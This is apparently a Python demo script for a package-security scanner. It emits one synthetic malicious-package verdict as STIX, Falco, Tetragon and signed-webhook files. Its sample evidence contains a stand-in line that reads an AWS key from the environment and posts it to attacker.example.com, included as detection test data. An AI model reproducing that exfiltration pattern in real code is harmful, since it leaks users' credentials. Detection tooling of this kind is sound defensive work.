"""Sink end-to-end demo — 합성 malicious 판정 1건을 3 sink 로 동시 emit.

생성물:
  reports/sink_demo/
    stix_<id>.json           # STIX 2.1 bundle
    falco_<id>.yaml          # Falco rules
    tetragon_<id>.yaml       # Tetragon TracingPolicy
    webhook_payload.json     # POST body 와 HMAC 서명 (재현용)

데모용 — 실제 webhook 호출은 하지 않음. 호출자가 위 4개 파일을
SIEM / runtime sensor 로 들고 가서 즉시 동작 가능한지 확인.
"""
from __future__ import annotations

import json
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from pkgsentinel.realtime.sinks import (
    FalcoPolicySink,
    STIXSink,
    hmac_sign,
)


def main():
    sample_report = {
        "verdict": "MALICIOUS",
        "package": "evil-stealer",
        "ecosystem": "PyPI",
        "version": "0.0.1",
        "evidence": [{
            "code_snippet": (
                "os.environ.get('AWS_KEY')\n"
                "requests.post('https://attacker.example.com/c2', data=base64.b64encode(...))"
            ),
            "ttp_id": "T1041",
            "ttp_url": "https://attack.mitre.org/techniques/T1041/",
            "llm_reasoning": "Credential theft via env + http exfil chain",
            "confidence": 0.94,
        }],
        "package_meta": {
            "advisory_summary": "exfil to attacker.example.com",
        },
    }

    out_dir = ROOT / "reports" / "sink_demo"
    out_dir.mkdir(parents=True, exist_ok=True)

    print(f"=== Sink E2E demo ===\noutput dir: {out_dir}\n")

    # 1) STIX
    stix = STIXSink(out_dir=str(out_dir))
    r1 = stix.emit(sample_report)
    print(f"  STIX     -> {Path(r1['file']).name}  "
          f"sha256={r1['sha256'][:12]}..")

    # 2) Falco / Tetragon
    falco = FalcoPolicySink(out_dir=str(out_dir))
    r2 = falco.emit(sample_report)
    print(f"  Falco    -> {Path(r2['falco']).name}")
    print(f"  Tetragon -> {Path(r2['tetragon']).name}")

    # 3) Webhook payload (HMAC 서명) — 호출은 하지 않고 파일로만 dump
    body = json.dumps(sample_report, ensure_ascii=False).encode("utf-8")
    ts = int(time.time() * 1000)
    secret = "demo-shared-secret"
    sig = hmac_sign(secret, ts, body)
    webhook_path = out_dir / "webhook_payload.json"
    webhook_path.write_text(json.dumps({
        "headers": {
            "X-AISLOPSQ-Event": "package.verdict",
            "X-AISLOPSQ-Timestamp": str(ts),
            "X-AISLOPSQ-Signature": f"sha256={sig}",
            "X-AISLOPSQ-Tool": "ai-slopsquatting/2.0",
            "Content-Type": "application/json",
        },
        "body": sample_report,
        "note": (
            "POST 이 헤더로 보내면 수신자는 hmac_verify(secret, ts, body, sig) "
            "로 검증. 5분 이상 오래된 ts 는 replay 로 거부."
        ),
    }, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"  Webhook  -> {webhook_path.name}  (HMAC sig={sig[:16]}..)")

    print("\nAll sinks emitted. Each file is independent and consumable by:")
    print("  STIX json    → OpenCTI / MISP / TAXII server")
    print("  Falco yaml   → /etc/falco/rules.d/ ")
    print("  Tetragon yaml→ kubectl apply -f tracingpolicy")
    print("  Webhook      → POST 후 수신자가 HMAC 검증")


if __name__ == "__main__":
    main()
